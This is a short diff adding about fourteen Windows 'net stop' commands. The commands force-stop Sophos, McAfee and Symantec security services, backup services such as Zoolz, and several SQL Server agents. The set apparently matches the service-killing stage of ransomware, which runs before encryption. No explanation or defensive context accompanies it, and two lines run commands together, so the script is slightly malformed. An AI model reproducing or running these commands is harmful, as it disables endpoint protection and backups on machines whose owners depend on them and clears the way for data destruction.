@@ -1,0 +1,14 @@
+
+net stop SQLAgent$SYSTEM_BGC /y
+net stop “Sophos Device Control Service” /y
+net stop macmnsvc /y
+net stop SQLAgent$ECWDB2 /y
+net stop “Zoolz 2 Service” /y
+net stop McTaskManager /y
+net stop “Sophos AutoUpdate Service” /y
+net stop “Sophos System Protection Service” /y
+net stop EraserSvc11710 /y
+net stop PDVFSService /y net stop SQLAgent$PROFXENGAGEMENT /y
+net stop SAVService /y
+net stop MSSQLFDLauncher$TPSAMA /y
+net stop EPSecurityService /y net stop SQLAgent$SOPHOS /y
